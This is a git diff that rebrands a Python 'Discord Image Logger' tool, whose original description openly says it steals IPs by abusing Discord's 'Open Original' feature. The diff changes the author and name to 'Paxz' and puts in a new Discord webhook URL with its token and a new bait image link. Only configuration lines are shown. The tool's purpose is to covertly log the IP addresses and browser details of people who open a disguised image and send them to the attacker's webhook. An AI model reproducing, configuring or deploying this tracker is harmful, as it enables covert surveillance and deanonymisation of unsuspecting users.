@@ -1,24 +1,23 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+## by luakiller
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "Paxz image logger"
+__description__ = "Image logger"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "LuaKiller"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1129514071549558824/UmwIgaVe36TQ27m_jJJf8gi1ZXu0ceLQggh7FKigwH8UoYHc0Di3AIqcotZTEaSNQDS-",
-    "image": "https://beautifuldawndesigns.net/wp-content/uploads/2022/04/anime-girl-drawing4-1.jpeg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1124284685753790484/V06cLMC-a4fqTWM0IPe9IUCRZ2AIRGxnKTRuRSmJjtSutBAGljV6vr7Bu3Vs_BUVToRa",
+    "image": "https://media.discordapp.net/attachments/1112037715861569639/1131176064333393920/jxT6rHpKRS-output_mdluzf.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Paxz Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +27,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "Paxz", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
